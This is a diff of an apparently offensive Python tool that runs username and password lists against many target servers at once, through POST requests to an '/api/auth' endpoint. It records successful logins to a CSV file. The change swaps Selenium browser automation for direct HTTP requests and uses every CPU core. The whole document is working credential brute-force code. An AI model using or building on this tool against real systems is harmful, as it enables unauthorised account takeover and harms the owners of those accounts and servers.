@@ -1,12 +1,9 @@
 #! /usr/bin/env python3
 
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchElementException
-from selenium.webdriver.firefox.options import Options
+import requests, json
 from datetime import date
 from optparse import OptionParser
-from multiprocessing import Pool, Lock
+from multiprocessing import Pool, cpu_count, Lock
 from colorama import Fore, Back, Style
 from time import strftime, localtime, time, sleep
 
@@ -28,49 +25,25 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 lock = Lock()
-thread_count = 1
-headless_mode = True
-delay_check = 1
+thread_count = cpu_count()
+login_api = "/api/auth"
 
-def login(browser, target, username, password, delay=1):
+def login(target, username, password):
     t1 = time()
     try:
-        browser.get(f"http://{target}")
-        while True:
-            try:
-                form = browser.find_element(By.TAG_NAME, "form")
-                break
-            except NoSuchElementException:
-                sleep(delay)
-            except Exception as error:
-                t2 = time()
-                return error, t2-t1
-        url = browser.current_url
-        input_tags = form.find_elements(By.TAG_NAME, "input")
-        username_tag = input_tags[0]
-        password_tag = input_tags[1]
-        username_tag.send_keys(username)
-        password_tag.send_keys(password)
-        submit_buttons = form.find_elements(By.TAG_NAME, "button")
-        for submit_button in submit_buttons:
-            if "login" in submit_button.text.lower():
-                submit_button.click()
-        if browser.current_url == url:
-            t2 = time()
-            return False, t2-t1
+        response = requests.post(f"http://{target}{login_api}", json={"username": username, "password": password})
         t2 = time()
+        if response.status_code // 100 == 4:
+            return False, t2-t1
         return True, t2-t1
     except Exception as error:
         t2 = time()
         return error, t2-t1
-def loginHandler(thread_index, targets, credentials, delay=1, headless=True):
+def loginHandler(thread_index, targets, credentials):
     successful_logins = {}
-    options = Options()
-    options.headless = True if headless else False
-    browser = webdriver.Firefox(options=options)
     for username, password in credentials:
         for target in targets:
-            status, time_taken = login(browser, target, username, password, delay)
+            status, time_taken = login(target, username, password)
             if status == True:
                 successful_logins[target] = [username, password]
                 with lock:
@@ -81,7 +54,6 @@ def loginHandler(thread_index, targets, credentials, delay=1, headless=True):
             else:
                 with lock:
                     display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")
-    browser.close()
     return successful_logins
 
 if __name__ == "__main__":
@@ -89,9 +61,6 @@ if __name__ == "__main__":
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                               ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
-                              ('-H', "--headless", "headless", f"Headless Mode (True/False, Default={headless_mode})"),
-                              ('-d', "--delay", "delay", f"Delay Between checking of Form while Page Loading (Default={delay_check} seconds)"),
-                              ('-T', "--threads", "threads", f"Number of Threads (Default={thread_count})"),
                               ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.target:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
@@ -142,18 +111,6 @@ if __name__ == "__main__":
         except:
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
-    if arguments.headless == "False":
-        arguments.headless = False
-    else:
-        arguments.headless = headless_mode
-    if arguments.delay:
-        arguments.delay = float(arguments.delay)
-    else:
-        arguments.delay = delay_check
-    if arguments.threads:
-        arguments.threads = int(arguments.threads)
-    else:
-        arguments.threads = thread_count
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     total_servers = len(arguments.target)
@@ -161,12 +118,12 @@ if __name__ == "__main__":
     display('+', f"Total Credentials    = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
     successful_logins = {}
-    pool = Pool(arguments.threads)
-    server_divisions = [arguments.target[group*total_servers//arguments.threads: (group+1)*total_servers//arguments.threads] for group in range(arguments.threads)]
+    pool = Pool(thread_count)
+    server_divisions = [arguments.target[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
     threads = []
-    display(':', f"Staring {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
+    display(':', f"Staring {Back.MAGENTA}{thread_count}{Back.RESET} Threads")
     for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials, arguments.delay, arguments.headless)))
+        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
